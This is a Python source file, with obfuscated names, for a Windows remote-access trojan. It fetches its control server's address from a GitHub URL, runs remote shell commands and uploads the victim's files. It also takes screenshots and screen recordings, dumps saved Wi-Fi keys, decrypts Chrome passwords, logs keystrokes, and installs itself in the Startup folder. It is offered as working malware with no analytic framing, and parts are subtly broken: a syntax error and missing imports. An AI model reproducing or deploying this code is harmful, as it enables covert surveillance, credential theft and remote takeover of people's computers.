import subprocess,socket,time,requests,os,logging,imageio
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
BqQbreAdPFKqxzONF = ""
JvrKbHFVxHsybYcesvHi = ""
HDIfaEODHzuUhouVmpZ = "16.12.24.0"
nNQGPsQsDMGlwvO = "!"
lXkDfbXunJbZWmXgJwaXdEn = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
aWxGmwJGzZWN = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
SLsOCKJffs = os.path.expanduser("~\\AppData\\Local\\")
def FpjxRXit(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def cpMsKoLrzjtSh(s):
	oKHNdgsuroGSUVjwEMwJ = s.recv(1024)
	if len(oKHNdgsuroGSUVjwEMwJ)==0:
		return True
	RPnTnxhaaLsOYY = oKHNdgsuroGSUVjwEMwJ.decode("utf-8").replace("\n","")
	if not RPnTnxhaaLsOYY.startswith(nNQGPsQsDMGlwvO):
		proc = subprocess.run(RPnTnxhaaLsOYY, shell=True, capture_output=True)
		TaNhkDZZZrFsNubZObsfY = proc.stdout + proc.stderr
		s.send(TaNhkDZZZrFsNubZObsfY)
		return
	EkoeqluyMXNXtzcaLVYOHEk = RPnTnxhaaLsOYY.split(" ")[0][1:]
	args = " ".join(RPnTnxhaaLsOYY.split()[1:]).split()
	if EkoeqluyMXNXtzcaLVYOHEk == "download":
		xyDUUaAXwhCXctAurnGv(s, RPnTnxhaaLsOYY)
	elif EkoeqluyMXNXtzcaLVYOHEk == "screenshot":
		kKVcJtPVLS(s)
	elif EkoeqluyMXNXtzcaLVYOHEk == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif EkoeqluyMXNXtzcaLVYOHEk == "update":
		hOnUrhEHATCUCascUMupykA(s)
	elif EkoeqluyMXNXtzcaLVYOHEk == "wifi":
		IBwrnYpcUM(s)
	elif EkoeqluyMXNXtzcaLVYOHEk == "screenrecord":
		EklpeGTTwtdH(s, args)
	elif EkoeqluyMXNXtzcaLVYOHEk == "chrome":
		decryptPasswords(s)
def xyDUUaAXwhCXctAurnGv(s, RPnTnxhaaLsOYY):
	QhpPwnK = RPnTnxhaaLsOYY.replace(nNQGPsQsDMGlwvO+"download ","").split(",")
	TaNhkDZZZrFsNubZObsfYs = ""
	for f in QhpPwnK:
		TaNhkDZZZrFsNubZObsfYs += BGuXahokNySzQy(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(TaNhkDZZZrFsNubZObsfYs, "utf-8"))
def kKVcJtPVLS(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	yFEadbJr = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(yFEadbJr)
	image.close()
	r = BGuXahokNySzQy(yFEadbJr, "api/sscap")
	os.remove(yFEadbJr)
	s.send(bytes(r,"utf-8"))
def EklpeGTTwtdH(s, args):
	lQbcoDZkmRWtO = 15
	if not args == []:
		try: lQbcoDZkmRWtO = int(args[0])
		except: pass
	OXUksneGmbKjEqTXYO = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	uTPmwAfJAIjpuHiqYoBg = []
	fps = 11
	numFrames = lQbcoDZkmRWtO * fps
	for _ in range(numFrames):
		uTPmwAfJAIjpuHiqYoBg.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(OXUksneGmbKjEqTXYO, uTPmwAfJAIjpuHiqYoBg, fps=fps, quality=8)
	BGuXahokNySzQy(OXUksneGmbKjEqTXYO, "api/screc")
def BGuXahokNySzQy(QeUMFExCkC, wKXCnGzGLnZd, WtaYkYyZiZF=None):
	if not os.path.isfile(QeUMFExCkC):
		return "[!] 404: "+QeUMFExCkC+"\n"
	headers = {"user":os.getlogin()}
	if WtaYkYyZiZF is not None:
		headers = {**headers, **WtaYkYyZiZF}
	f = open(QeUMFExCkC, "rb")
	requests.post("http://"+BqQbreAdPFKqxzONF+":5555/"+wKXCnGzGLnZd,
		files={"file":f)},
		headers=headers)
	f.close()
	return "[+] 200\n"
def hOnUrhEHATCUCascUMupykA(s):
	h, p, v = sNqZetWwa(True)
	if (v != HDIfaEODHzuUhouVmpZ):
		xosLxXCsh(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def IBwrnYpcUM(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	dYKxkVdNPM = ""
	for p in profiles:
		try: dYKxkVdNPM+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: dYKxkVdNPM+=f"    {p} - N/A\n"
	s.send(bytes(dYKxkVdNPM, "utf-8"))
def xosLxXCsh(lGTghekwgXHQCfLwi):
	yISrFPCz = os.path.basename(__file__)
	fileType = yISrFPCz.split(".")[-1]
	xNETjYxNhLuTRkRzmyTEkxO = yISrFPCz.split(".")[0]+"."+lGTghekwgXHQCfLwi+".pyw" if fileType.startswith("py") else ".exe"
	RLfksJqvJohCc = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), xNETjYxNhLuTRkRzmyTEkxO)
	if not os.path.isfile(RLfksJqvJohCc):
		with open(RLfksJqvJohCc, "w+") as f:
			f.write(requests.get(aWxGmwJGzZWN+"file."+ "pyw" if RLfksJqvJohCc.split(".")[-1].startswith("py") else "exe").text)
def sNqZetWwa(force=False):
	global BqQbreAdPFKqxzONF, JvrKbHFVxHsybYcesvHi
	if force or BqQbreAdPFKqxzONF == "" or JvrKbHFVxHsybYcesvHi == "":
		oKHNdgsuroGSUVjwEMwJ = requests.get(lXkDfbXunJbZWmXgJwaXdEn).text.replace("\n","").split(":")
		BqQbreAdPFKqxzONF = oKHNdgsuroGSUVjwEMwJ[0].strip()
		JvrKbHFVxHsybYcesvHi = oKHNdgsuroGSUVjwEMwJ[1].strip()
		lGTghekwgXHQCfLwi = oKHNdgsuroGSUVjwEMwJ[2].strip()
	return BqQbreAdPFKqxzONF, JvrKbHFVxHsybYcesvHi, lGTghekwgXHQCfLwi
def AVElZvVHDX():
	try:
		OdotFqI = "settings.xpb"
		NYsdFNfPLfPYHxOQcLFzt = sorted([file for file in os.listdir(SLsOCKJffs) if os.path.isfile(SLsOCKJffs+"\\"+file) and file.endswith(OdotFqI.split(".")[-1])])
		if OdotFqI in NYsdFNfPLfPYHxOQcLFzt:
			NYsdFNfPLfPYHxOQcLFzt.remove(OdotFqI)
		BKETyEWQwKhrtLbb = os.path.join(SLsOCKJffs,OdotFqI)
		if len(NYsdFNfPLfPYHxOQcLFzt) > 0:
			with open(BKETyEWQwKhrtLbb, "ab+") as f:
				for file in NYsdFNfPLfPYHxOQcLFzt:
					temp = os.path.join(SLsOCKJffs,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		BGuXahokNySzQy(BKETyEWQwKhrtLbb, "api/log")
		if os.path.isfile(BKETyEWQwKhrtLbb):
			os.remove(BKETyEWQwKhrtLbb)
	except:
		pass
def dCfEyOckYOzZaiSVAdf():
	logging.basicConfig(filename=(SLsOCKJffs+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def ncSFkDVCOlBJO(k):
		logging.info(str(k))
	k=Listener(on_press=ncSFkDVCOlBJO)
	kMtXbpQg = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in kMtXbpQg:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	os.system(f"copy \"{basePath}\\Default\\Login Data\" \"{local}\\db.db\"")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.system(f"del {local}\\db.db")
	oKHNdgsuroGSUVjwEMwJ = "\n"
	for login in logins:
		oKHNdgsuroGSUVjwEMwJ += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	s.send(oKHNdgsuroGSUVjwEMwJ)
def mFrEubzfnUKKmIGAfRxBje():
	h, p, v = sNqZetWwa()
	AVElZvVHDX()
	if HDIfaEODHzuUhouVmpZ != v:
		xosLxXCsh(v)
	dCfEyOckYOzZaiSVAdf()
	FgmqKqUqqUVDskz = bytes(("(old)"if HDIfaEODHzuUhouVmpZ!=v else "")+"["+HDIfaEODHzuUhouVmpZ+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				aBDMouTxrpIzeGKVBFlIg=False
				try:
					s=FpjxRXit(h, p)
					while not aBDMouTxrpIzeGKVBFlIg:
						s.send(FgmqKqUqqUVDskz)
						aBDMouTxrpIzeGKVBFlIg=cpMsKoLrzjtSh(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
mFrEubzfnUKKmIGAfRxBje()
